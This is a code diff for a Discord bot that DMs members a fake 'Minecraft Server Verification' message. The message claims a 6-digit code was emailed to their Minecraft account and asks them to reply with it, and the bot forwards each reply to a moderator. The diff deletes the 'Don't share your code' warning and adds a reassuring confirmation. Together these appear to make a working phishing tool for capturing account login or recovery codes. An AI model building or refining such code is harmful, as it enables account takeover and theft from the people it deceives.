@@ -73,23 +73,21 @@ async def promptcode(interaction: discord.Interaction, user: discord.Member):
     if user.id in sent_verification_dms:
         await interaction.response.send_message("✅ Already sent the prompt.", ephemeral=True)
         return
-    
+
     try:
         embed = discord.Embed(
             title="📨 Minecraft Server Verification",
-            description=( 
+            description=(
                 "We've sent a 6-digit code to your email linked to Minecraft.\n\n"
                 "Reply to this DM with the code to complete verification.\n\n"
-                "🔒 Your info is private. Don't share your code."
+                "🔒 Your info is private."
             ),
             color=discord.Color.blue()
         )
         await user.send(embed=embed)
         sent_verification_dms.add(user.id)
-        # Acknowledge the interaction after the DM is successfully sent
         await interaction.response.send_message("✅ Prompt sent.", ephemeral=True)
     except discord.errors.Forbidden:
-        # Handle the case where the bot can't send a DM
         await interaction.response.send_message("❌ Couldn't send DM. Please make sure your DMs are open.", ephemeral=True)
 
 @bot.event
@@ -106,7 +104,13 @@ async def on_message(message: discord.Message):
                 color=discord.Color.teal()
             )
             await mod.send(embed=embed)
-            await message.channel.send("✅ Code received. A mod will review it.")
+
+            confirm_embed = discord.Embed(
+                title="✅ Code Received",
+                description="Your code was submitted successfully. Please wait up to 3 minutes to receive your role.",
+                color=discord.Color.green()
+            )
+            await message.channel.send(embed=confirm_embed)
         else:
             if message.author.id not in sent_invalid_codes:
                 embed = discord.Embed(
